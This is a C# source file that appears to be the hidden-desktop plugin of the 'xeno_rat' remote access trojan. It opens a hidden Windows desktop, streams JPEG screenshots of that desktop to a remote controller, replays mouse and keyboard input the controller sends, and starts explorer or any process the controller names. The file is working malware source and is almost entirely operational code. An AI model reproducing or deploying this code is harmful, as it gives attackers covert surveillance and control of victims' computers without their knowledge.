using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;
using Hidden_handler;
using System.IO;
using System.Drawing;
using System.Threading;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Plugin
{
    public class Main
    {
        Node ImageNode;
        bool playing = false;
        int quality = 100;
        Imaging_handler ImageHandler;
        input_handler InputHandler;
        Process_Handler ProcessHandler;
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            if (!await AcceptSubSubNode(node))
            {
                ImageNode?.Disconnect();
                node.Disconnect();
            }
            Thread thread = new Thread(async()=>await ScreenShotThread());
            thread.Start();
            try
            {
                string DesktopName=Encoding.UTF8.GetString(await node.ReceiveAsync());
                ImageHandler = new Imaging_handler(DesktopName);
                InputHandler = new input_handler(DesktopName);
                ProcessHandler = new Process_Handler(DesktopName);
                while (node.Connected())
                {
                    byte[] data = await node.ReceiveAsync();
                    if (data == null)
                    {
                        ImageNode?.Disconnect();
                        break;
                    }
                    if (data[0] == 0)
                    {
                        playing = true;
                    }
                    else if (data[0] == 1)
                    {
                        playing = false;
                    }
                    else if (data[0] == 2)
                    {
                        quality = node.sock.BytesToInt(await node.ReceiveAsync());
                    }
                    else if (data[0] == 3)
                    {
                        uint msg = (uint)node.sock.BytesToInt(await node.ReceiveAsync());
                        IntPtr wParam = (IntPtr)node.sock.BytesToInt(await node.ReceiveAsync());
                        IntPtr lParam = (IntPtr)node.sock.BytesToInt(await node.ReceiveAsync());
                        new Thread(() => InputHandler.Input(msg, wParam, lParam)).Start();
                    }
                    else if (data[0] == 4) 
                    {
                        ProcessHandler.StartExplorer();
                    }
                    else if (data[0] == 5)
                    {
                        ProcessHandler.CreateProc(Encoding.UTF8.GetString(await node.ReceiveAsync()));
                    }
                }
            }
            catch
            {

            }
            node.Disconnect();
            ImageNode?.Disconnect();
            ImageHandler?.Dispose();
            InputHandler?.Dispose();
            GC.Collect();

        }
        public async Task ScreenShotThread()
        {
            try
            {
                
                while (ImageNode.Connected())
                {
                    if (!playing)
                    {
                        await Task.Delay(500);
                        continue;
                    }
                    try
                    {
                        Bitmap img = ImageHandler.Screenshot();
                        EncoderParameters encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

                        ImageCodecInfo codecInfo = GetEncoderInfo(ImageFormat.Jpeg);
                        byte[] data;
                        using (MemoryStream stream = new MemoryStream())
                        {
                            img.Save(stream, codecInfo, encoderParams);
                            data= stream.ToArray();
                        }
                        await ImageNode.SendAsync(data);
                    }
                    catch
                    {

                    }
                }
            }
            catch { }
        }
        private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }

            return null;
        }
        public async Task<bool> AcceptSubSubNode(Node node)
        {
            byte[] id = await node.ReceiveAsync();
            if (id != null)
            {
                int nodeid = node.sock.BytesToInt(id);
                Node tempnode = null;
                foreach (Node i in node.Parent.subNodes)
                {
                    if (i.SetId == nodeid)
                    {
                        await node.SendAsync(new byte[] { 1 });
                        tempnode = i;
                        break;
                    }
                }
                if (tempnode == null)
                {
                    await node.SendAsync(new byte[] { 0 });
                    return false;
                }
                node.AddSubNode(tempnode);
                ImageNode = tempnode;
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
